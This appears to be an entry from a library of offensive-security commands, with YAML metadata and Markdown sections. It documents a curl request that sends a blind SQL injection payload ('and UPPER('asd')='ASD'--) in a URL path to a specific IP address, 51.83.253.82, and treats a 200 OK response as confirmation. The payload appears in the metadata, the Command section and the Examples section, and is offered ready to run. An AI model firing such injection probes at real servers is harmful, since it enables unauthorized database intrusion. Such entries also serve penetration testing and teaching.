---
data: 'curl -i "http://51.83.253.82/item/default''and UPPER(''asd'')=''ASD''--"'
tags:
  - sqli
  - injection
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:20.339Z'
id: 80533a6d-b72d-4439-b13e-49a6cf4b43e3
verified: false
validated: true
submitted: true
---
# curl-sqli-test-true

## Command

```bash
curl -i "http://51.83.253.82/item/default'and UPPER('asd')='ASD'--"
```

## Description

Injects a true boolean SQL condition to confirm blind SQLi via 200 OK response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-i` | Include headers | Yes |
| URL with payload | Injection point | Yes |

## Examples

### Basic Usage

```bash
curl -i "http://51.83.253.82/item/default'and UPPER('asd')='ASD'--"
```

## Expected Output

HTTP/1.1 200 OK, confirming successful injection.

## Related

- [[Related Procedure: Test-for-Blind-SQL-Injection-in-URI-Path]]
